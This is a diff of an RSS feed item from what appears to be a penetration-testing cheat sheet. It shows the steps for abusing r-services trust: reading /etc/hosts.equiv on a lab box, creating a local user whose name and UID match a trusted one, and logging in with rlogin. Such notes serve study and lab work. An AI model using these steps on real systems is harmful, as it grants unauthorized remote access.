@@ -12,7 +12,7 @@
       <link>https://tldrbins.github.io/r_services/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/r_services/</guid>
-      <description>Abuse #1: Fake a User 1. Check cat /etc/hosts.equiv (remote) www-data@reset:/home/sadm$ cat /etc/hosts.equiv # /etc/hosts.equiv: list of hosts and users that are granted &amp;#34;trusted&amp;#34; r # command access to your system . - root - local + sadm 2. Create the Target User Locally # Create a fake user sudo useradd &amp;lt;USER&amp;gt; # Set password sudo passwd &amp;lt;USER&amp;gt; $ sudo useradd sadm $ sudo passwd sadm New password: Retype new password: passwd: password updated successfully $ cat /etc/passwd | grep sadm sadm:x:1001:1001::/home/sadm:/bin/sh # Switch user su &amp;lt;USER&amp;gt; 3.</description>
+      <description>Abuse #1: Fake a User 1. Check cat /etc/hosts.equiv (remote) www-data@reset:/home/sadm$ cat /etc/hosts.equiv # /etc/hosts.equiv: list of hosts and users that are granted &amp;#34;trusted&amp;#34; r # command access to your system . - root - local + sadm 2. Create the Target User Locally # Create a fake user sudo adduser --uid &amp;lt;UID&amp;gt; &amp;lt;USER&amp;gt; # Switch user su &amp;lt;USER&amp;gt; 3. Connect # Installation sudo apt install rsh-redone-client # Connect rlogin &amp;lt;TARGET&amp;gt; 4.</description>
     </item>
   </channel>
 </rss>
